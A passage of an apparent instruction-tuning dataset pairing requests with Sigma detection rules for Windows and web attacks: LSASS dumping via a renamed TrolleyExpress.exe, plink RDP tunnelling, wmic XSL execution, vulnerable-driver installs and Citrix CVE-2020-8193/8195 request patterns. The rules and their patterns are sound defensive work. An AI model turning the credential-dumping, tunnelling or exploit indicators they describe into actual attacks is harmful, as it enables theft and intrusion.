    "instruction": "Build a Sigma rule with the goal of detecting possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory, you should: focus on monitoring Windows process creation logs. Specifically, look out for commands containing references to 'TrolleyExpress' followed by a single digit ranging from 7 to 9, both with and without the '.exe' extension. This range is indicative of an attempt to specify a process ID associated with lsass.exe, based on the assumption that its process ID is between 700 and 999. Additionally, any command lines ending with 'TrolleyExpress.exe -ma', which is a common parameter used in memory dumping processes, should be flagged. Further attention should be paid to instances where the executable image has been renamed to 'TrolleyExpress.exe', especially in scenarios where the original file name contains 'CtxInstall' or is absent, as these could potentially mask unauthorized memory dump attempts. It's essential to note that these criteria primarily target techniques associated with Credential Access through LSASS memory content acquisition, with a high level of scrutiny due to the likelihood of false positives being unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n      # We assume that the lsass.exe process has a process ID that's between 700 and 999 and the dumper uses just the PID as parameter\n            - '\\TrolleyExpress 7'\n            - '\\TrolleyExpress 8'\n            - '\\TrolleyExpress 9'\n            - '\\TrolleyExpress.exe 7'\n            - '\\TrolleyExpress.exe 8'\n            - '\\TrolleyExpress.exe 9'\n      # Common dumpers\n            - '\\TrolleyExpress.exe -ma '\n    renamed:\n        Image|endswith: '\\TrolleyExpress.exe'\n    filter_renamed:\n        OriginalFileName|contains: 'CtxInstall'\n    filter_empty:\n        OriginalFileName: null\n    condition: selection or ( renamed and not 1 of filter* )\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n      # We assume that the lsass.exe process has a process ID that's between 700 and 999 and the dumper uses just the PID as parameter\n            - '\\TrolleyExpress 7'\n            - '\\TrolleyExpress 8'\n            - '\\TrolleyExpress 9'\n            - '\\TrolleyExpress.exe 7'\n            - '\\TrolleyExpress.exe 8'\n            - '\\TrolleyExpress.exe 9'\n      # Common dumpers\n            - '\\TrolleyExpress.exe -ma '\n    renamed:\n        Image|endswith: '\\TrolleyExpress.exe'\n    filter_renamed:\n        OriginalFileName|contains: 'CtxInstall'\n    filter_empty:\n        OriginalFileName: null\n    condition: selection or ( renamed and not 1 of filter* )\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory",
      "answer": "In order to detect a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory, you should: focus on monitoring Windows process creation logs. Specifically, look out for commands containing references to 'TrolleyExpress' followed by a single digit ranging from 7 to 9, both with and without the '.exe' extension. This range is indicative of an attempt to specify a process ID associated with lsass.exe, based on the assumption that its process ID is between 700 and 999. Additionally, any command lines ending with 'TrolleyExpress.exe -ma', which is a common parameter used in memory dumping processes, should be flagged. Further attention should be paid to instances where the executable image has been renamed to 'TrolleyExpress.exe', especially in scenarios where the original file name contains 'CtxInstall' or is absent, as these could potentially mask unauthorized memory dump attempts. It's essential to note that these criteria primarily target techniques associated with Credential Access through LSASS memory content acquisition, with a high level of scrutiny due to the likelihood of false positives being unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc)..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc), you should monitor Windows images loaded for occurrences when `wmic.exe` is executed in conjunction with either `jscript.dll` or `vbscript.dll`. These libraries are indicative of script execution which can be an attempt to execute arbitrary JavaScript or VBScript code through wmic's ability to process XSL files. However, note that not all instances where `wmic.exe` loads `vbscript.dll` or `jscript.dll` are malicious. For example, legitimate commands like `wmic os get lastboottuptime` or `wmic os get locale`, which also load `vbscript.dll`, should not be considered indicators of this attack. Consequently, to mitigate potential false positives and gain further insight into the context of the `wmic.exe` execution, it's advisable to investigate related process creation events, command line arguments, and the parent-child process relationships. This approach ensures a more accurate determination of whether the activity is malevolent, especially since the sole image load event data may not provide sufficient context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        ImageLoaded|endswith:\n            - '\\jscript.dll'\n            - '\\vbscript.dll'\n    condition: selection\nfalsepositives:\n    - The command wmic os get lastboottuptime loads vbscript.dll\n    - The command wmic os get locale loads vbscript.dll\n    - Since the ImageLoad event doesn't have enough information in this case. It's better to look at the recent process creation events that spawned the WMIC process and investigate the command line and parent/child processes to get more insights\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\wmic.exe'\n        ImageLoaded|endswith:\n            - '\\jscript.dll'\n            - '\\vbscript.dll'\n    condition: selection\nfalsepositives:\n    - The command wmic os get lastboottuptime loads vbscript.dll\n    - The command wmic os get locale loads vbscript.dll\n    - Since the ImageLoad event doesn't have enough information in this case. It's better to look at the recent process creation events that spawned the WMIC process and investigate the command line and parent/child processes to get more insights\nlevel: medium\n",
      "question": "threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc).",
      "answer": "In order to detect threat actors proxy executing code and bypassing application controls by leveraging wmic and the `/FORMAT` argument switch to download and execute an XSL file (i.e js, vbs, etc), you should monitor Windows images loaded for occurrences when `wmic.exe` is executed in conjunction with either `jscript.dll` or `vbscript.dll`. These libraries are indicative of script execution which can be an attempt to execute arbitrary JavaScript or VBScript code through wmic's ability to process XSL files. However, note that not all instances where `wmic.exe` loads `vbscript.dll` or `jscript.dll` are malicious. For example, legitimate commands like `wmic os get lastboottuptime` or `wmic os get locale`, which also load `vbscript.dll`, should not be considered indicators of this attack. Consequently, to mitigate potential false positives and gain further insight into the context of the `wmic.exe` execution, it's advisable to investigate related process creation events, command line arguments, and the parent-child process relationships. This approach ensures a more accurate determination of whether the activity is malevolent, especially since the sole image load event data may not provide sufficient context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Execution of plink to perform data exfiltration and tunneling.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute plink to perform data exfiltration and tunneling, you should focus on detecting the process creation events on Windows systems that indicate the use of plink.exe, a command-line interface tool for secure shell (SSH) tunneling. Specifically, monitor for instances where plink.exe is executed with command lines that include attempts to connect to the local address 127.0.0.1 on port 3389, which is commonly used for Remote Desktop Protocol (RDP) connections, or directly specifying \":3389\" indicating an attempt to establish or interact with an RDP session through tunneling. Additionally, be vigilant for plink.exe processes launched with command lines specifying SSH tunneling through commonly used ports 443 (HTTPS) and 22 (SSH) with the '-P' flag, as these could also signify attempts at secure data exfiltration or tunneling. It is crucial to note that while not all uses of plink.exe are malicious \u2013 such as when it\u2019s used for administrative activity \u2013 the specified patterns are highly indicative of unauthorized or malicious activity and warrant a high level of scrutiny.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_a:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':127.0.0.1:3389'\n    selection_b1:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':3389'\n    selection_b2:\n        CommandLine|contains:\n            - ' -P 443'\n            - ' -P 22'\n    condition: selection_a or all of selection_b*\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_a:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':127.0.0.1:3389'\n    selection_b1:\n        Image|endswith: '\\plink.exe'\n        CommandLine|contains: ':3389'\n    selection_b2:\n        CommandLine|contains:\n            - ' -P 443'\n            - ' -P 22'\n    condition: selection_a or all of selection_b*\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
      "question": "Execution of plink to perform data exfiltration and tunneling",
      "answer": "In order to execute plink to perform data exfiltration and tunneling, you should focus on detecting the process creation events on Windows systems that indicate the use of plink.exe, a command-line interface tool for secure shell (SSH) tunneling. Specifically, monitor for instances where plink.exe is executed with command lines that include attempts to connect to the local address 127.0.0.1 on port 3389, which is commonly used for Remote Desktop Protocol (RDP) connections, or directly specifying \":3389\" indicating an attempt to establish or interact with an RDP session through tunneling. Additionally, be vigilant for plink.exe processes launched with command lines specifying SSH tunneling through commonly used ports 443 (HTTPS) and 22 (SSH) with the '-P' flag, as these could also signify attempts at secure data exfiltration or tunneling. It is crucial to note that while not all uses of plink.exe are malicious \u2013 such as when it\u2019s used for administrative activity \u2013 the specified patterns are highly indicative of unauthorized or malicious activity and warrant a high level of scrutiny."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting When IIS uses an old .Net Framework it's possible to enumerate folders with the symbol \"~\".\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect if an attacker is attempting to enumerate folders on an Internet Information Services (IIS) web server using an outdated .Net Framework, identifiable by the usage of the \"~\" symbol, you should focus on monitoring web server logs for specific request patterns. These patterns include requests that contain the \"~1\" in the query part of the Uniform Resource Identifier (URI) and those where the URI query ends with 'a.aspx'. It's important to look for requests made using either the 'GET' or 'OPTIONS' methods. Additionally, only responses with status codes indicating success such as 200 (OK) or 301 (Moved Permanently) should be considered indicative of potential folder enumeration activity. This detection is crucial because it helps in identifying attempts to exploit older .Net Framework vulnerabilities to gain unauthorized access or information about the folder structure of the web application hosted on IIS web servers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains: '~1'\n        cs-uri-query|endswith: 'a.aspx'\n        cs-method:\n            - GET\n            - OPTIONS\n        #Success only\n        sc-status:\n            - 200\n            - 301\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection:\n        cs-uri-query|contains: '~1'\n        cs-uri-query|endswith: 'a.aspx'\n        cs-method:\n            - GET\n            - OPTIONS\n        #Success only\n        sc-status:\n            - 200\n            - 301\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "When IIS uses an old .Net Framework it's possible to enumerate folders with the symbol \"~\"",
      "answer": "In order to detect if an attacker is attempting to enumerate folders on an Internet Information Services (IIS) web server using an outdated .Net Framework, identifiable by the usage of the \"~\" symbol, you should focus on monitoring web server logs for specific request patterns. These patterns include requests that contain the \"~1\" in the query part of the Uniform Resource Identifier (URI) and those where the URI query ends with 'a.aspx'. It's important to look for requests made using either the 'GET' or 'OPTIONS' methods. Additionally, only responses with status codes indicating success such as 200 (OK) or 301 (Moved Permanently) should be considered indicative of potential folder enumeration activity. This detection is crucial because it helps in identifying attempts to exploit older .Net Framework vulnerabilities to gain unauthorized access or information about the folder structure of the web application hosted on IIS web servers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting installation of RTCore service. Which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the installation of RTCore service, which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse, you should: Monitor Windows system logs for entries that indicate the creation or modification of a service. Specifically, look for logs sourced from the Service Control Manager with an EventID of 7045, signaling a service was installed. Pay special attention to the service named 'RTCore64'. This particular service installation event is significant as it might be related to the abuse of a vulnerable driver associated with Micro-Star MSI Afterburner, a popular graphics card overclocking tool. This type of activity could potentially be utilized by attackers to gain unauthorized access or privileges within a system. Be mindful that some detections might be false positives, as not all instances of this service installation are malicious. Nonetheless, such events should be considered highly suspicious and warrant further investigation due to their potential security implications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'RTCore64'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n        ServiceName: 'RTCore64'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "installation of RTCore service. Which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse",
      "answer": "In order to detect the installation of RTCore service, which could be an indication of Micro-Star MSI Afterburner vulnerable driver abuse, you should: Monitor Windows system logs for entries that indicate the creation or modification of a service. Specifically, look for logs sourced from the Service Control Manager with an EventID of 7045, signaling a service was installed. Pay special attention to the service named 'RTCore64'. This particular service installation event is significant as it might be related to the abuse of a vulnerable driver associated with Micro-Star MSI Afterburner, a popular graphics card overclocking tool. This type of activity could potentially be utilized by attackers to gain unauthorized access or privileges within a system. Be mindful that some detections might be false positives, as not all instances of this service installation are malicious. Nonetheless, such events should be considered highly suspicious and warrant further investigation due to their potential security implications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential suspicious child processes of \"3CXDesktopApp.exe\". Which could be related to the 3CXDesktopApp supply chain compromise.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential suspicious child processes of \"3CXDesktopApp.exe\", which could be related to the 3CXDesktopApp supply chain compromise, you should monitor for the creation of certain processes when they are spawned as child processes by \"3CXDesktopApp.exe\" on Windows systems. Specifically, track the initiation of command-line tools and scripting engines, including 'cmd.exe', 'cscript.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', and 'wscript.exe'. The occurrence of these processes being started by \"3CXDesktopApp.exe\" should be considered highly suspicious and potentially indicative of a security threat related to a supply chain compromise. It's critical to react with high caution to these alerts, although it is acknowledged that false positives remain a possibility, albeit they are unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\3CXDesktopApp.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\3CXDesktopApp.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\wscript.exe'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential suspicious child processes of \"3CXDesktopApp.exe\". Which could be related to the 3CXDesktopApp supply chain compromise",
      "answer": "In order to detect potential suspicious child processes of \"3CXDesktopApp.exe\", which could be related to the 3CXDesktopApp supply chain compromise, you should monitor for the creation of certain processes when they are spawned as child processes by \"3CXDesktopApp.exe\" on Windows systems. Specifically, track the initiation of command-line tools and scripting engines, including 'cmd.exe', 'cscript.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', 'regsvr32.exe', 'rundll32.exe', and 'wscript.exe'. The occurrence of these processes being started by \"3CXDesktopApp.exe\" should be considered highly suspicious and potentially indicative of a security threat related to a supply chain compromise. It's critical to react with high caution to these alerts, although it is acknowledged that false positives remain a possibility, albeit they are unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect adversaries who might be stopping services or processes as part of an attack aiming for Data Destruction or Data Encryption for Impact particularly targeting data stores of critical services such as Exchange and SQL Server, you should monitor Windows process creation logs for the execution of 'taskkill.exe', a legitimate Windows utility that can be misused in such contexts. Specifically, look for occurrences where the 'Image' path ends with '\\taskkill.exe' or when the 'OriginalFileName' is exactly 'taskkill.exe'. Additionally, ensure that the 'CommandLine' arguments include both '/f' (forcing the termination of processes without warning) and '/im' (specifying the image name of the process to be terminated), used together in the command line. This pattern of usage can be indicative of malicious behavior aimed at stopping critical services or processes. However, it's important to note that there might be legitimate instances where software uses 'taskkill.exe' in a similar manner during installations or updates, which could lead to false positives. The detection is categorized under a low level of alert due to the potential for such expected benign activities triggering alerts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\taskkill.exe'\n        - OriginalFileName: 'taskkill.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /f'\n            - ' /im '\n    condition: all of selection*\nfalsepositives:\n    - Expected FP with some processes using this techniques to terminate one of their processes during installations and updates\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\taskkill.exe'\n        - OriginalFileName: 'taskkill.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - ' /f'\n            - ' /im '\n    condition: all of selection*\nfalsepositives:\n    - Expected FP with some processes using this techniques to terminate one of their processes during installations and updates\nlevel: low\n",
      "question": "Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server.",
      "answer": "In order to detect adversaries who might be stopping services or processes as part of an attack aiming for Data Destruction or Data Encryption for Impact particularly targeting data stores of critical services such as Exchange and SQL Server, you should monitor Windows process creation logs for the execution of 'taskkill.exe', a legitimate Windows utility that can be misused in such contexts. Specifically, look for occurrences where the 'Image' path ends with '\\taskkill.exe' or when the 'OriginalFileName' is exactly 'taskkill.exe'. Additionally, ensure that the 'CommandLine' arguments include both '/f' (forcing the termination of processes without warning) and '/im' (specifying the image name of the process to be terminated), used together in the command line. This pattern of usage can be indicative of malicious behavior aimed at stopping critical services or processes. However, it's important to note that there might be legitimate instances where software uses 'taskkill.exe' in a similar manner during installations or updates, which could lead to false positives. The detection is categorized under a low level of alert due to the potential for such expected benign activities triggering alerts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers, you should monitor Windows systems for file creations where the content indicates a download from the Internet (marked by '[ZoneTransfer]  ZoneId=3'), specifically targeting files with certain extensions like '.exe', '.scr', '.bat', '.cmd', '.docx', '.hta', '.jse', '.lnk', '.pptx', '.ps', '.reg', '.sct', '.vb', '.wsc', '.wsf', '.xlsx'. These files should also have a ':Zone.Identifier' indicating they've been marked by Windows as coming from the Internet, which can indicate potential risk if such files are executed or opened. The detection focuses on such file creations that were not initiated by well-known browsers (like Chrome, Firefox, Internet Explorer, Edge, and others) or specific known applications like the Snipping Tool. This is done by excluding the creation of these suspicious files when they're associated with the binary paths of these trusted apps, acknowledging that legitimate software might also download files from the Internet but with less associated risk. Additionally, any download activity from browsers not included in the detection's exclusion list or legitimate downloads via scripting or command-line tools that match these criteria should be investigated to determine their legitimacy. This approach is aimed at identifying potential malicious activities involving Alternate Data Streams to evade detection or persist on a system while minimizing the risk of flagging legitimate browser downloads as suspicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|startswith: '[ZoneTransfer]  ZoneId=3'\n        TargetFilename|endswith: ':Zone.Identifier'\n        TargetFilename|contains:\n            - '.exe'\n            - '.scr'\n            - '.bat'\n            - '.cmd'\n            - '.docx'\n            - '.hta'\n            - '.jse'\n            - '.lnk'\n            - '.pptx'\n            - '.ps'\n            - '.reg'\n            - '.sct'\n            - '.vb'\n            - '.wsc'\n            - '.wsf'\n            - '.xlsx'\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    filter_optional_snipping_tool:\n        Image|startswith: 'C:\\Program Files\\WindowsApps\\Microsoft.ScreenSketch_'\n        Image|endswith: '\\SnippingTool\\SnippingTool.exe'\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains|all:\n            - '\\AppData\\Local\\Packages\\Microsoft.ScreenSketch_'\n            - '\\TempState\\Screenshot '\n        TargetFilename|endswith: '.png:Zone.Identifier'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate browsers not currently included in the filter (please add them)\n    - Legitimate downloads via scripting or command-line tools (Investigate to determine if it's legitimate)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|startswith: '[ZoneTransfer]  ZoneId=3'\n        TargetFilename|endswith: ':Zone.Identifier'\n        TargetFilename|contains:\n            - '.exe'\n            - '.scr'\n            - '.bat'\n            - '.cmd'\n            - '.docx'\n            - '.hta'\n            - '.jse'\n            - '.lnk'\n            - '.pptx'\n            - '.ps'\n            - '.reg'\n            - '.sct'\n            - '.vb'\n            - '.wsc'\n            - '.wsf'\n            - '.xlsx'\n    filter_optional_brave:\n        Image|endswith: '\\brave.exe'\n    filter_optional_chrome:\n        Image:\n            - 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe'\n            - 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'\n    filter_optional_firefox:\n        Image:\n            - 'C:\\Program Files\\Mozilla Firefox\\firefox.exe'\n            - 'C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe'\n    filter_optional_ie:\n        Image:\n            - 'C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe'\n            - 'C:\\Program Files\\Internet Explorer\\iexplore.exe'\n    filter_optional_maxthon:\n        Image|endswith: '\\maxthon.exe'\n    filter_optional_edge_1:\n        - Image|startswith: 'C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\'\n        - Image|endswith: '\\WindowsApps\\MicrosoftEdge.exe'\n        - Image:\n            - 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'\n            - 'C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe'\n    filter_optional_edge_2:\n        Image|startswith:\n            - 'C:\\Program Files (x86)\\Microsoft\\EdgeCore\\'\n            - 'C:\\Program Files\\Microsoft\\EdgeCore\\'\n        Image|endswith:\n            - '\\msedge.exe'\n            - '\\msedgewebview2.exe'\n    filter_optional_opera:\n        Image|endswith: '\\opera.exe'\n    filter_optional_safari:\n        Image|endswith: '\\safari.exe'\n    filter_optional_seamonkey:\n        Image|endswith: '\\seamonkey.exe'\n    filter_optional_vivaldi:\n        Image|endswith: '\\vivaldi.exe'\n    filter_optional_whale:\n        Image|endswith: '\\whale.exe'\n    filter_optional_snipping_tool:\n        Image|startswith: 'C:\\Program Files\\WindowsApps\\Microsoft.ScreenSketch_'\n        Image|endswith: '\\SnippingTool\\SnippingTool.exe'\n        TargetFilename|startswith: 'C:\\Users\\'\n        TargetFilename|contains|all:\n            - '\\AppData\\Local\\Packages\\Microsoft.ScreenSketch_'\n            - '\\TempState\\Screenshot '\n        TargetFilename|endswith: '.png:Zone.Identifier'\n    condition: selection and not 1 of filter_optional_*\nfalsepositives:\n    - Other legitimate browsers not currently included in the filter (please add them)\n    - Legitimate downloads via scripting or command-line tools (Investigate to determine if it's legitimate)\nlevel: medium\n",
      "question": "creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers",
      "answer": "In order to detect the creation of a suspicious ADS (Alternate Data Stream) file by software other than browsers, you should monitor Windows systems for file creations where the content indicates a download from the Internet (marked by '[ZoneTransfer]  ZoneId=3'), specifically targeting files with certain extensions like '.exe', '.scr', '.bat', '.cmd', '.docx', '.hta', '.jse', '.lnk', '.pptx', '.ps', '.reg', '.sct', '.vb', '.wsc', '.wsf', '.xlsx'. These files should also have a ':Zone.Identifier' indicating they've been marked by Windows as coming from the Internet, which can indicate potential risk if such files are executed or opened. The detection focuses on such file creations that were not initiated by well-known browsers (like Chrome, Firefox, Internet Explorer, Edge, and others) or specific known applications like the Snipping Tool. This is done by excluding the creation of these suspicious files when they're associated with the binary paths of these trusted apps, acknowledging that legitimate software might also download files from the Internet but with less associated risk. Additionally, any download activity from browsers not included in the detection's exclusion list or legitimate downloads via scripting or command-line tools that match these criteria should be investigated to determine their legitimacy. This approach is aimed at identifying potential malicious activities involving Alternate Data Streams to evade detection or persist on a system while minimizing the risk of flagging legitimate browser downloads as suspicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts against Citrix Netscaler, Application Delivery Controller (ADS), and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195, you should monitor web server logs for specific patterns in the URI query. Look for queries containing '/rapi/filedownload?filter=path:%2F'. Additionally, watch for queries that include all the following parameters: '/pcidss/report', 'type=all_signatures', and 'sig_name=_default_signature_'. These queries are potential indicators of an attack exploiting the mentioned CVE vulnerabilities. Ensure to capture the client IP, the virtual host, the full URL, and the response code for any request that matches these patterns. It is important to note that while this detection strategy is critical for identifying possible exploitation attempts, there might be unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains: '/rapi/filedownload?filter=path:%2F'\n    selection2:\n        cs-uri-query|contains|all:\n            - '/pcidss/report'\n            - 'type=all_signatures'\n            - 'sig_name=_default_signature_'\n    condition: 1 of selection*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection1:\n        cs-uri-query|contains: '/rapi/filedownload?filter=path:%2F'\n    selection2:\n        cs-uri-query|contains|all:\n            - '/pcidss/report'\n            - 'type=all_signatures'\n            - 'sig_name=_default_signature_'\n    condition: 1 of selection*\nfields:\n    - client_ip\n    - vhost\n    - url\n    - response\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "exploitation attempt against Citrix Netscaler, Application Delivery Controller (ADS) and Citrix Gateway exploiting vulnerabilities reported as CVE-2020-8193 and CVE-2020-8195",
